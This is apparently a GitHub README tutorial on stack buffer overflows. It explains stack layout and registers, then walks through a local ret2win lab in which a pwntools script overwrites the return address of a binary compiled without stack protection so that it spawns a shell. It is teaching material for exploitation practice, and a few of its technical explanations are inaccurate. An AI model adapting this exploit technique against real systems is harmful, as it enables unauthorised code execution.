# Buffer Overflow

![image](https://user-images.githubusercontent.com/91763346/196140273-7d011149-a523-4ef2-9045-7f131c402042.png)

Hello everyone! This Buffer Overflow documentation provides the complete demonstration, understanding and the scripts necessary for buffer overflow exploitation.

## Introduction

**What is buffer?**

1. A buffer is an area in the computer RAM reserved for temporary data storage. Data such as: User input, Parts of a video file, Server banners received by a client application
2. **Buffers are stored in a stack (LIFO)**

A **buffer overflow** occurs when **more data is put into a fixed-length buffer** than the buffer can handle.

**Buffer Overflow Attack**: Overwriting the return address value of the stack which is intended to return CPU to the next instruction in main following the function call.

## Tools Needed

1. GCC Debugger
2. Kali Linux or any other Linux Distro.
3. Git
4. python3
5. pwntools

## Memory Stack

The stack grows from high address(0xffffffff) to low address(0x00000000).

Say you have 32 gb of RAM, so 2^32 addresses will be available.

![image](https://user-images.githubusercontent.com/91763346/194780684-9d93ce1e-7ab8-414d-9f48-fec77c0466a7.png)

**Kernel** → When **system** boots, then memory will filled by device drivers.

**Stack** holds the **local** **variables for each of your functions**. When you call a new function for example printf and then some parameters - that gets put on the end of the stack.

**Heap** → Big area of memory that you can allocate huge chunks, dynamic memory allocation. *Heap grows in the up direction & stack grows in the downward direction.* 

**Data** → initialised/**uninitialised(BSS segment)** variables get held here.

**Text** → Actual **code** of our programme (exe file), read-only. 

- Global variables are stored in data segment.
- Local variables & ptr are stored in stack. ptr will be in stack but its data will be stored in heap.
- Static & uninitialised variables are stored in BSS segment.

 

**Registers**

1. **stack pointer (ESP)**: register containing the address of the **top** of the stack.
2. **base pointer (EBP)**: register containing the address of the **bottom** of the stack frame.
3. **instruction pointer (EIP):** register containing the **address of the instruction** to be executed.

## Anatomy of Stack

When we look into the memory stack, we will find 4 main components:

1. Extended Stack Pointer (ESP)
2. Buffer Space
3. Extended Base Pointer (EBP)
4. Extended Instruction Pointer (EIP) / Return Address

![image](https://user-images.githubusercontent.com/91763346/194780701-1df5feee-3fa0-48eb-8c10-f44294f7be47.png)

Buffer space is used as a storage area for memory in some coding languages. With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself.

![image](https://user-images.githubusercontent.com/91763346/194780710-bc6da833-6c37-4d0f-bb6d-09e0a4363af5.png)

In the above example, you can see that a a number of A’s (x41) were sent to the buffer space, but were correctly sanitized. The A’s did not escape the buffer space and thus, no buffer overflow occurred.

![image](https://user-images.githubusercontent.com/91763346/194780718-26a8fd84-df2a-41a3-b868-e4da542043e0.png)

Now, the A’s have completely escaped the buffer space and have actually reached the EIP. This is an example of a buffer overflow and how poor coding can become dangerous. If an attacker can gain control of the EIP, he or she can use the pointer to point to malicious code and gain a reverse shell.

## Hands On Example

Basic demonstration of a buffer overflow **ret2win** exploit. This example is compiled to a **32-bit** program, and has stack protection disabled.

```
gcc -o win0 win0.c -m32 -fno-stack-protector
```
Let's import the git repo using the command **git clone** :

```
git clone https://github.com/videxrealone/Buffer-Overflow/
```

Let's install python3 along with pwntools :

```
$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
$ python3 -m pip install --upgrade pip
$ python3 -m pip install --upgrade pwntools
```
## Goal

Using the program **win0**, you need to call the function **win()** and pop a **shell**. No file modification is allowed.

## Solution

This exploit is about the function **puts()**, **win()**, **gets()** and to display how dangerous a buffer overflow attack can be. 
Let me guide you through a simple solution in which we'll be using python3 alongside **gdb**

Let's start by inspecting the source file **win0.c** :
```
cat win0.c
```
We can cleary see that the **Win()** functions calls a **/bin/sh** and that gives us access to a shell that we can use to execute commands.
How to trigger the "**win()**" ?

Let's debug the file using GDB :
```
gdb win0
```
Let's try running the program using the command run :

```
run
```
Now lets use a simple input that DOES NOT exceed 80 bytes :

```
AAAAAAAAAA
```
We can see that the program worked just fine, let's try re-running it while using an out of bound input. (any input that exceeds 80 bytes) :

```
gdb> run

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
We can see that we got a segmentation fault and that the program crashed, thats because we have overflooded the stack and corrupted the return addresses :

Let's try to locate the address of the **win()** function :

We can use **info functions** to display all functions that are using in the ELF (Executable Linkable File).

```
gdb> info functions
```
or we can use a much simpler method to give us directly the address of the win().
```
gdb> x win
```
Let's save that address for now.

Let's quit gdb using **quit** :

```
gdb> quit
```

In linux we can execute simple python commands directly in the terminal using **-c**, can you run a simple **"print ('Hello world!') "** ?

```
python -c "------------"
```
Now that we know how to execute commands in python, I should tell you about a facinating secret in linux, you can actually run more than one command in a terminal! 
let's try it!
Let's run 2 python programs with the **" && "** (logical AND). 

```
python -c "print('Hello')" && python -c "print('World')"
```
We can also do it with **" ; "** (The semicolomn method is helpful when writing **BASH** scripts).

```
python -c "print('Hello')" ; python -c "print('World')"
```


Let's go back to our program.
Let's try to force-call the **"win()"** address, what we're going to do is to simply concatinate the address with a small playload of letters.

There's something else you should know, **STACK WORKS IN REVERSE!** (you can google Little Endian & Big Endian)

![image](https://user-images.githubusercontent.com/91763346/194781982-6f6d27e8-62d9-462e-843c-0e2266ace887.png)

So now, knowing that it works as a little endian, we can easily inject it, to force the **"win()"** callout.
Let's go ahead and write a script.

Let's create a python program.

```
$ touch exploit.py
$ nano exploit.py  // you can also use : vim exploit.py
```

Using any text editor of your choice, **copy** this text inside the file using **CTRL + SHIFT + C** and **paste it** using **CTRL + SHIFT + V**  :

```
from pwn import *

p=process("./win0") #the 

win = 0x08049186 #win address. 

payload = b""
payload += b"A" * 88   #Segmentation offset
payload += p32(0x0)    #This is a padding, used to create some space to get the right offset
payload += p32(win)

#final payload would look something like this: payload=" 'A'*88"+'\x00'+'\x86\x91\x04\x08' "

p.sendline(payload)   #used to send the payload once the process executes.
p.interactive()     #made to make link the payload and the process.

```
And now let's run the python script and become hackers 🕶️. 
```
$ python3 exploit.py
[+] Starting local process './win0': pid 3539
[*] Switching to interactive mode
Input:
$ whoami
kali
```
That's basically us getting a shell on our own machine, now imagine if that were to be on a target machine, well, the next phase would be **maintaining persistnace** and **privilage escalation**.

Remember that stack works in reverse! & that python is a very powerful tool that you need to learn if you're willing to get deeper into CyberSec.

## Resources

https://ctf101.org/binary-exploitation/overview/
https://ir0nstone.gitbook.io/notes/types/stack/introduction
